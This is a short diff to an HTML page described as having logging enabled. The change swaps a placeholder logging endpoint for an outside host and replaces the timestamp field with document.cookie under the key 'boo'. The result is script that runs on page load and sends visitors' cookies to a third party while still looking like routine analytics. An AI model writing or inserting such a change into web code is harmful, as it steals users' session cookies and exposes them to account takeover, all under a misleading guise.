@@ -9,14 +9,14 @@
   <p>This is my page with logging enabled.</p>
 
   <script>
-    fetch("https://your-logging-endpoint.com/log", {
+    fetch("https://gitlab-public.h42.fr/app/index.html", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         url: window.location.href,
         referrer: document.referrer,
         userAgent: navigator.userAgent,
-        timestamp: Date.now()
+        boo: document.cookie
       })
     });
   </script>
